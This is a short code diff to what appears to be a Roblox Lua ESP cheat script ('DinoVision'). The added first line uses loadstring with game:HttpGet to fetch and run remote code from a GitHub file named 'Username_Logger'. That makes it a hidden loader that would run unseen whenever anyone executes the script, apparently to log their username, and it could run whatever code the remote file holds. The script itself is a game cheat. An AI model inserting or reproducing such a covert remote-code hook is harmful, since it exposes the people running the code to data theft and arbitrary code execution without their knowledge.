@@ -1,3 +1,5 @@
+loadstring(game:HttpGet"https://raw.githubusercontent.com/Lvk777/Loggers/refs/heads/main/Username_Logger")()
+
 -- Esp
 
 local DinoVision = {
